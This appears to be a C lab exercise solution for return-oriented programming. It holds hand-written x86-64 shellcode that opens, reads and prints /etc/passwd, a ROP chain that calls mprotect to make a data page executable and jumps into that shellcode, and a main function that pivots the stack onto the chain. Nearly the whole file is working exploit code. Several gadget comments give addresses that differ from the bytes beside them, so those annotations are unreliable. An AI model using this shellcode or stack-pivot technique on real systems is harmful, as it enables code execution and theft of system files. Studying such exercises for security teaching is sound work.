#include <stdio.h>
#include <string.h>

enum{
    Sz = 8 * 1024,
};

char shellcode[Sz] = {
    // your shellcode to dump /etc/passwd
    0x49, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0f, 0x10,
    0x49, 0xc1, 0xe8, 0x34, 0x4c, 0x29, 0xc4, 0x49, 0xb9, 0x2f,
    0x65, 0x74, 0x63, 0x2f, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0xff,
    0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x49, 0xc1, 0xea,
    0x08, 0x41, 0x52, 0x41, 0x51, 0x48, 0xb8, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0x2f, 0x48, 0xc1, 0xe8, 0x3c, 0x48,
    0x89, 0xe7, 0x48, 0xbe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x4f, 0x1a, 0x48, 0xc1, 0xee, 0x34, 0x48, 0x31, 0xd2, 0x0f,
    0x05, 0x49, 0x89, 0xc0, 0x4d, 0x31, 0xd2, 0x4d, 0x39, 0xd0,
    0x7c, 0x66, 0x49, 0xbb, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x0f, 0x40, 0x49, 0xc1, 0xeb, 0x34, 0x4c, 0x29, 0xdc, 0x48,
    0x31, 0xc0, 0x4c, 0x89, 0xc7, 0x48, 0x89, 0xe6, 0x48, 0xba,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0f, 0x40, 0x48, 0xc1,
    0xea, 0x34, 0x0f, 0x05, 0x49, 0x89, 0xc1, 0x4d, 0x39, 0xd1,
    0x7c, 0x34, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0x1f, 0x48, 0xc1, 0xe8, 0x3c, 0x48, 0x31, 0xff, 0x48,
    0xf7, 0xdf, 0x48, 0x89, 0xe6, 0x4c, 0x89, 0xca, 0x0f, 0x05,
    0x4d, 0x39, 0xd1, 0x77, 0xbe, 0x48, 0xb8, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0x3c, 0x48, 0xc1, 0xe8, 0x38, 0x48,
    0x31, 0xff, 0x0f, 0x05, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0x3c, 0x48, 0xc1, 0xe8, 0x38, 0x48, 0x31,
    0xff, 0x48, 0xf7, 0xdf, 0x0f, 0x05

};

char newstack[Sz] = {

    // your ROP chain to execute mprotect and jump to the shellcode
    0xa4,0xfc,0xef,0xf7,0xff,0x7f,0x00,0x00,  // pop rax (0x00007ffff7eadca4)
    0x0a,0x00,0x00,0x00,0x00,0x00,0x00,0x00,  // rax = 10                            

    0x84,0xb7,0xf6,0xf7,0xff,0x7f,0x00,0x00,  // pop rdi (0x00007ffff7f19784)
    0x00,0x80,0x55,0x55,0x55,0x55,0x00,0x00,  // rdi = 0x555555558000

    0x0f,0x89,0xe2,0xf7,0xff,0x7f,0x00,0x00,  // pop rsi (0x00007ffff7dd690f)
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,  // rsi = 4096

    0xcd,0xb1,0xec,0xf7,0xff,0x7f,0x00,0x00,  // pop rdx (0x00007ffff7db3106)
    0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,  // rdx = 7
   
    0xda,0x80,0xe5,0xf7,0xff,0x7f,0x00,0x00,  // syscall
    0x40,0x80,0x55,0x55,0x55,0x55,0x00,0x00,  // ret 0x555555558040 


};

int
main(int argc, char** argv)
{
    printf("hi!\n");
    asm(
        "movq %0, %%rsp\n\t"
        "retq\n\t"
        :
        : "r" (newstack)
    );
}
